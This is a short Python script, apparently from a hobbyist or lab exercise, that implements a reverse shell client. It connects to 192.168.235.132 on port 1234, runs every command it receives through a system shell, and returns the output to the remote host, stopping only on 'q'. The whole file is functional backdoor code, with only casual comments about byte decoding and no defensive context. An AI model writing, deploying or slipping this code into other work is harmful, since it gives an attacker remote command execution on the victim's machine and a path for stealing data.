#!/usr/bin/python3

import socket
import subprocess as sp


def shell():
	while True:
		command = s.recv(1024).decode('utf-8')

		# Use b'q' because the command variable is a byte type after receiving from the server' --> Just use decode :))
		if command == 'q':
			break
		else:
			proc = sp.Popen(command, shell=True, stdout=sp.PIPE, stdin=sp.PIPE, stderr=sp.PIPE)
			result = proc.stdout.read() + proc.stderr.read() # Apparently the data return from proc or maybe function read() from subprocess is already returned as bytes :))

			s.send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.235.132", 1234))

shell()

s.close()
